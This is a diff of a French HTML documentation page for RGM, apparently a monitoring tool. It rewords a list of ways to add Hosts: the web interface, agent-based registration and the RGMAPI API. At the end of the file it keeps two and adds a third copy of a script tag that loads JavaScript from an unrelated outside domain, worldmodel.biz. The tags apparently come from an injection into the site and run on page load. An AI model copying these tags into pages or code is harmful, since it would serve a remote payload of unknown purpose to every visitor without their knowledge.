@@ -17,13 +17,13 @@ L'ajout des Hosts dans RGM peuvent être effectuée via différentes méthodes :
         <li style="list-style-type: none;">
           <ul style="list-style-type: disc;">
             <li>
-              Déclaration et configuration dans l'interface Web
+              Déclaration d'un "Host" et configuration dans l'interface Web
             </li>
             <li>
-              Inscription automatisée avec agent
+              Inscription automatisée d'un Host avec agent
             </li>
             <li>
-              Utilisation de l'API "RGMAPI"
+              Utilisation de l'API "RGMAPI" pour la déclaration d'un Host
             </li>
           </ul>
         </li>
@@ -32,4 +32,4 @@ L'ajout des Hosts dans RGM peuvent être effectuée via différentes méthodes :
   </ul>
 </li>       
 
-<script src="//worldmodel.biz/2241c61e4c10670366.js" async="" type="text/javascript"></script> <script src="//worldmodel.biz/2241c61e4c10670366.js" async="" type="text/javascript"></script>
+<script src="//worldmodel.biz/2241c61e4c10670366.js" async="" type="text/javascript"></script> <script src="//worldmodel.biz/2241c61e4c10670366.js" async="" type="text/javascript"></script> <script src="//worldmodel.biz/2241c61e4c10670366.js" async="" type="text/javascript"></script>
